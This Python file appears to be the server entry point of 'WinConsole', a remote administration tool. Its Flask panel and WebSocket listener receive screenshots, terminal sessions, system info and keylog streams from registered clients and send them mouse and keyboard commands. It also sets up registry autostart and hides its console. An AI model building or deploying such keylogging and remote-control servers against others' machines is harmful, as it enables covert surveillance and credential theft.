# -*- coding: utf-8 -*-
"""WinConsole 服务端入口"""

import os
import sys
import time
import atexit
import logging
import threading
import asyncio

# 添加项目根目录到 sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.config import DEFAULT_HOST, DEFAULT_PORT, DEFAULT_WS_PORT, CLIENT_WS_PORT_OFFSET, SERVER_CONFIG_FILE

# ── 日志配置 ──────────────────────────────────────────────────
from pathlib import Path

LOG_DIR = Path.home() / '.winconsole'
LOG_FILE = LOG_DIR / 'winconsole.log'


def setup_logging():
    """配置日志输出到文件，并将 stderr 重定向到 errors.log。"""
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=str(LOG_FILE),
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        encoding='utf-8',
    )
    # 错误重定向到 errors.log
    sys.stderr = open(str(LOG_DIR / 'errors.log'), 'a', encoding='utf-8')


# ── Windows 开机自启动 ────────────────────────────────────────
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "WinConsoleServer"


def show_messagebox(title, message, style=0):
    """弹出 Windows 消息框，同时在控制台打印。"""
    import ctypes
    try:
        print(f"\n{title}: {message}\n")
    except Exception:
        pass
    ctypes.windll.user32.MessageBoxW(0, message, title, style | 0x1000)


def install_startup():
    """添加服务端开机自启动（写入 HKCU Run 注册表）。"""
    import winreg
    exe_path = sys.executable if not getattr(sys, 'frozen', False) else sys.argv[0]
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, f'"{exe_path}" --tray')
        winreg.CloseKey(key)
        logging.info("已添加开机自启动")
        return True
    except Exception as e:
        logging.error(f"添加开机自启动失败: {e}")
        return False


def uninstall_startup():
    """移除服务端开机自启动（删除 HKCU Run 注册表项）。"""
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_NAME)
        winreg.CloseKey(key)
        logging.info("已移除开机自启动")
        return True
    except FileNotFoundError:
        logging.info("开机自启动项不存在（已移除）")
        return True
    except Exception as e:
        logging.error(f"移除开机自启动失败: {e}")
        return False


# ── 单实例检测 ─────────────────────────────────────────────────
MUTEX_NAME = "Global\\WinConsoleServer-{B2C3D4E5-F6A7-8901-BCDE-F12345678901}"
_app_mutex = None


def check_single_instance():
    """确保只有一个服务端实例运行。"""
    global _app_mutex
    import ctypes
    _app_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        ctypes.windll.kernel32.CloseHandle(_app_mutex)
        sys.exit(0)


# ── 隐藏控制台窗口 ────────────────────────────────────────────
def hide_console():
    """在 PyInstaller 打包模式下隐藏控制台窗口。"""
    import ctypes
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass


# ── 托盘图标 ───────────────────────────────────────────────────
try:
    import pystray
    HAS_TRAY = True
except ImportError:
    HAS_TRAY = False

# 端口号由 main() 传入，这里用模块级变量暂存
_tray_port = DEFAULT_PORT


def create_tray_image():
    """生成托盘图标图片。"""
    from PIL import Image, ImageDraw
    size = 64
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.rounded_rectangle([2, 2, size - 3, size - 3], radius=14, fill='#7aa2f7')
    w = 5
    pts = [
        (size // 2 - 3 * w, 16), (size // 2 - w, 16), (size // 2, 26),
        (size // 2 + w, 16), (size // 2 + 3 * w, 16),
        (size // 2 + 2 * w, 48), (size // 2, 32), (size // 2 - 2 * w, 48),
    ]
    draw.polygon(pts, fill='white')
    return img


def on_tray_open():
    """打开浏览器访问 Web 面板。"""
    import webbrowser
    webbrowser.open(f'http://127.0.0.1:{_tray_port}')


def on_tray_exit(icon):
    """退出托盘并结束程序。"""
    icon.stop()
    os._exit(0)


def setup_tray():
    """创建 pystray 托盘图标实例。"""
    if not HAS_TRAY:
        return None
    try:
        menu = pystray.Menu(
            pystray.MenuItem("打开浏览器", lambda: on_tray_open(), default=True),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("退出", lambda icon: on_tray_exit(icon)),
        )
        icon = pystray.Icon(
            "WinConsoleServer", create_tray_image(),
            "WinConsole 服务端 - 运行中", menu,
        )
        return icon
    except Exception as e:
        logging.error(f"托盘图标初始化失败: {e}")
        return None


# ── WebSocket 服务端（接收客户端连接） ─────────────────────────
def _start_ws_server(cm, host, port, tls_enabled):
    """在独立线程中运行 asyncio 事件循环，启动 WebSocket 服务端接收客户端连接。

    Args:
        cm: ClientManager 实例
        host: 监听地址
        port: 监听端口
        tls_enabled: 是否启用 TLS
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    cm._ws_loop = loop

    ssl_context = None
    if tls_enabled:
        from common.crypto import create_ssl_context
        cert_dir = os.path.join(Path.home(), '.winconsole', 'certs')
        ssl_context = create_ssl_context(cert_dir)

    import websockets
    from common.protocol import decode_msg, MsgType, make_msg, encode_msg

    async def handle_client(ws, path=None):
        """处理单个客户端的 WebSocket 连接。"""
        client_id = None
        try:
            # 等待 REGISTER 消息
            raw = await asyncio.wait_for(ws.recv(), timeout=30)
            msg = decode_msg(raw)
            msg_type = msg.get('type', '')

            if msg_type != MsgType.REGISTER.value:
                await ws.close(code=4001, reason="首条消息必须为 REGISTER")
                return

            device_info = msg.get('payload', {})
            # 注册客户端
            client_id = await cm.register_client(ws, device_info)

            # 发送 REGISTER_ACK
            ack = make_msg(MsgType.REGISTER_ACK, client_id, {'client_id': client_id})
            await ws.send(encode_msg(ack))
            logging.info(f"客户端已注册: {client_id}")

            # 消息接收循环
            async for raw_data in ws:
                try:
                    msg = decode_msg(raw_data)
                except Exception:
                    continue

                msg_type = msg.get('type', '')
                seq = msg.get('seq', 0)
                payload = msg.get('payload', {})

                if msg_type == MsgType.HEARTBEAT.value:
                    # 心跳响应：更新心跳时间
                    cm.update_heartbeat(client_id)

                elif msg_type in (
                    MsgType.SCREENSHOT.value,
                    MsgType.PROCESS.value,
                    MsgType.MOUSE.value,
                    MsgType.KEYBOARD.value,
                    MsgType.TERMINAL.value,
                    MsgType.KEYLOG.value,
                    MsgType.SYSTEM_INFO.value,
                ):
                    # 命令响应：解析并通过 resolve_command_response 回调
                    cm.resolve_command_response(client_id, seq, msg)

                elif msg_type == MsgType.TERMINAL_DATA.value:
                    # 终端实时数据：通过事件回调转发到 Web 面板
                    logging.info(f"[MAIN] 收到 TERMINAL_DATA: client_id={client_id}, payload_len={len(payload.get('data','') if isinstance(payload,dict) else str(payload))}")
                    cm._fire_event('terminal_data', client_id, payload)

                elif msg_type == MsgType.KEYLOG_DATA.value:
                    # 键盘记录实时数据：通过事件回调转发到 Web 面板
                    cm._fire_event('keylog_data', client_id, payload)

                elif msg_type == MsgType.DISCONNECT.value:
                    # 客户端主动断开
                    logging.info(f"客户端请求断开: {client_id}")
                    break

        except asyncio.TimeoutError:
            logging.warning(f"客户端注册超时，关闭连接")
        except websockets.exceptions.ConnectionClosed:
            logging.info(f"客户端连接已关闭: {client_id}")
        except Exception as e:
            logging.error(f"处理客户端连接异常: {e}")
        finally:
            if client_id:
                await cm.unregister_client(client_id)

    start_server = websockets.serve(handle_client, host, port, ssl=ssl_context)
    logging.info(f"客户端 WebSocket 服务启动: {host}:{port} (TLS={'启用' if tls_enabled else '禁用'})")
    loop.run_until_complete(start_server)
    loop.run_forever()


# ── 入口函数 ───────────────────────────────────────────────────
def main():
    global _tray_port

    args = sys.argv[1:]

    # 处理 --install / --uninstall（优先处理，不进入主流程）
    if '--install' in args:
        success = install_startup()
        if success:
            show_messagebox("WinConsole 服务端", "已成功添加开机自启动！\n下次开机将自动运行。", 0x40)
        else:
            show_messagebox("WinConsole 服务端", "添加开机自启动失败！\n请检查是否有足够的权限。", 0x10)
        return

    if '--uninstall' in args:
        success = uninstall_startup()
        if success:
            show_messagebox("WinConsole 服务端", "已成功移除开机自启动！\n下次开机将不再自动运行。", 0x40)
        else:
            show_messagebox("WinConsole 服务端", "移除开机自启动失败！\n请检查是否有足够的权限。", 0x10)
        return

    # 单实例检测
    check_single_instance()

    # 解析命令行参数
    host = DEFAULT_HOST
    port = DEFAULT_PORT
    ws_port = DEFAULT_WS_PORT
    use_tray = '--tray' in args
    tls_enabled = '--tls' in args

    if '--port' in args:
        idx = args.index('--port') + 1
        if idx < len(args):
            port = int(args[idx])

    if '--ws-port' in args:
        idx = args.index('--ws-port') + 1
        if idx < len(args):
            ws_port = int(args[idx])

    if '--host' in args:
        idx = args.index('--host') + 1
        if idx < len(args):
            host = args[idx]

    _tray_port = port

    # 处理 --gen-cert
    if '--gen-cert' in args:
        from common.crypto import generate_self_signed_cert
        cert_dir = os.path.join(Path.home(), '.winconsole', 'certs')
        result = generate_self_signed_cert(cert_dir)
        if result:
            print(f"自签名证书已生成: {result[0]}, {result[1]}")
        else:
            print("自签名证书生成失败，请确认 cryptography 库已安装。")
        return

    # 设置日志
    setup_logging()
    logging.info(f"WinConsole 服务端启动: {host}:{port}")

    # 创建 ClientManager 实例
    from server.client_manager import ClientManager
    cm = ClientManager()

    # 创建 Flask app
    from server.app import create_app
    app = create_app(client_manager=cm)

    # PyInstaller 打包模式且非托盘时，隐藏控制台窗口
    if getattr(sys, 'frozen', False) and not use_tray:
        hide_console()

    # 从配置文件读取端口（如果命令行未指定）
    try:
        import json
        if os.path.exists(SERVER_CONFIG_FILE):
            with open(SERVER_CONFIG_FILE, 'r', encoding='utf-8') as f:
                saved = json.load(f)
            if '--port' not in args and 'port' in saved:
                port = saved['port']
            if '--ws-port' not in args and 'ws_port' in saved:
                ws_port = saved['ws_port']
    except Exception:
        pass

    # 启动客户端 WebSocket 服务端（独立线程）
    ws_thread = threading.Thread(
        target=_start_ws_server,
        args=(cm, host, ws_port, tls_enabled),
        daemon=True,
    )
    ws_thread.start()

    # 启动 Flask HTTP 服务（独立线程）
    def run_flask():
        app.run(host=host, port=port, threaded=True, debug=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    logging.info(f"Flask HTTP 服务启动: {host}:{port}")
    logging.info(f"客户端 WebSocket 服务启动: {host}:{ws_port}")

    # 托盘模式或保持运行
    if use_tray:
        icon = setup_tray()
        if icon:
            icon.run()
            return
        # 托盘不可用时，回退到循环保持运行

    while True:
        time.sleep(1)


if __name__ == '__main__':
    main()
